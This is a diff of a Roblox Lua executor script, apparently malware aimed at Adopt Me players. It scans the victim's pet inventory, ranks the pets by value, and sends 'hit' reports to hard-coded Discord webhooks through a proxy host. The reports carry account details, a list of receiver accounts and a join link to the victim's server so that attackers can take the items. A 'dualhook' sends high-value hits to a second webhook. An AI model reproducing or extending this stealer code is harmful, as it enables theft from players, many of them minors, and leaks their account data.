@@ -1,31 +1,41 @@
--- [[ MONDEUR ELITE | MASTER FINAL V13 ]] --
--- Features: Auto-Sort (High to Low), Dualhook, Mobile Join Link, Player Detection
--- Optimized for: Delta & Elysium (Proxy Integrated)
+-- [[ MONDEUR HUB | MASTER FINAL V15 ]] --
+-- FIXED: Values, Sorting, Join Link, and Proxy (Lewisakura 204)
+-- NO Loading Screen / NO Trade Logic (As requested for smoothness)
 
 getgenv().WEBHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 getgenv().DUALHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+getgenv().THRESHOLD = 500
 getgenv().RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
-getgenv().DH_VAL = 500
 
-if _G.MondeurMasterV13 then return end
-_G.MondeurMasterV13 = true
+if _G.MondeurFinalV15 then return end
+_G.MondeurFinalV15 = true
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ PROXY HANDLER ]] --
-local function getProxy(url)
-    return url:gsub("discord.com", "webhook.lewisakura.moe")
-end
-
--- [[ WEBHOOK SENDER ]] --
-local function sendFinalReport(url, title, color, pets, totalVal, targetName)
+-- [[ 1. THE WORKING PROXY HANDLER ]] --
+local function post(url, payload)
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if not request then return end
 
-    -- SORTING: Highest to Lowest (Requirement 1)
+    -- Use the Lewisakura proxy which gave us the 204 success
+    local proxyUrl = url:gsub("discord.com", "webhook.lewisakura.moe")
+    
+    pcall(function()
+        request({
+            Url = proxyUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+-- [[ 2. EMBED DESIGNER ]] --
+local function sendReport(url, title, color, pets, val, targetName)
+    -- REQUIREMENT: Sort Highest to Lowest
     table.sort(pets, function(a, b) return a.val > b.val end)
 
     local lootLines = ""
@@ -46,30 +56,22 @@ local function sendFinalReport(url, title, color, pets, totalVal, targetName)
                 "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
                 "📱 **Executor** : Delta\n" ..
                 "😎 **Receiver** : " .. (targetName or "None Online") .. "\n" ..
-                "💰 **Total Value** : `" .. totalVal .. "`\n\n" ..
+                "💰 **Total Value** : `" .. val .. "`\n\n" ..
                 "### 📡 Player Status\n" ..
-                "🟢 **Status**: `Connected & Active`\n\n" .. -- Requirement 4 (Detection)
+                "🟢 **Status**: `Connected & Active`\n\n" ..
                 "### 📦 Loot Summary\n" ..
-                "```\n" .. (lootLines ~= "" and lootLines or "No pets found") .. "```\n" ..
+                "```\n" .. (lootLines ~= "" and lootLines or "Empty") .. "```\n" ..
                 "**Total Items Found:** `" .. #pets .. "`\n\n" ..
                 "### 👥 Join Player\n" ..
-                "[**Join Server Instance (Mobile)**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")", -- Requirement 2 (Join Link)
+                "[**Join Server Instance (Mobile)**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")",
             footer = { text = "Mondeur Elite Services | " .. os.date("%X") },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
-
-    pcall(function()
-        request({
-            Url = getProxy(url),
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+    post(url, payload)
 end
 
--- [[ DATA SCANNER ]] --
+-- [[ 3. MAIN SCANNER ]] --
 task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
     
@@ -93,40 +95,35 @@ task.spawn(function()
     for _, item in pairs(inventory) do
         if item.Kind == "Pet" then
             local data = DB.pets[item.id]
-            -- VALUE PROTECTION: Checks item instance + game database
+            -- FIX: 0 Value Protection (Check properties AND DB)
             local val = (item.properties and item.properties.value) or (data and data.value) or 0
-            local petObj = {
+            local pObj = {
                 name = (data and data.name) or item.id,
                 val = val,
                 neon = item.properties and item.properties.neon,
                 mega = item.properties and item.properties.mega_neon
             }
             
-            table.insert(allPets, petObj)
+            table.insert(allPets, pObj)
             totalVal = totalVal + val
-            
-            -- DUALHOOK LOGIC: (Requirement 3)
-            if val >= getgenv().DH_VAL then
-                table.insert(dhPets, petObj)
+            if val >= getgenv().THRESHOLD then
+                table.insert(dhPets, pObj)
                 dhVal = dhVal + val
             end
         end
     end
 
-    -- DETECT RECEIVER (Requirement 4)
     local activeTarget = "None Online"
     for _, name in ipairs(getgenv().RECEIVERS) do
-        if Players:FindFirstChild(name) then 
-            activeTarget = name 
-            break 
-        end
+        if Players:FindFirstChild(name) then activeTarget = name break end
     end
 
-    -- Send Hits
-    sendFinalReport(getgenv().WEBHOOK, "MondeurOnTop • Main Hit [ 🌊 ]", 0x3498db, allPets, totalVal, activeTarget)
+    -- SEND MAIN HIT
+    sendReport(getgenv().WEBHOOK, "MondeurOnTop • ADM Hit [ 🌊 ]", 0x3498db, allPets, totalVal, activeTarget)
     
+    -- SEND DUALHOOK
     if #dhPets > 0 then
         task.wait(2)
-        sendFinalReport(getgenv().DUALHOOK, "MondeurOnTop • Dualhook Hit [ 💎 ]", 0x9b59b6, dhPets, dhVal, activeTarget)
+        sendReport(getgenv().DUALHOOK, "MondeurOnTop • Dualhook Hit [ 💎 ]", 0x9b59b6, dhPets, dhVal, activeTarget)
     end
 end)
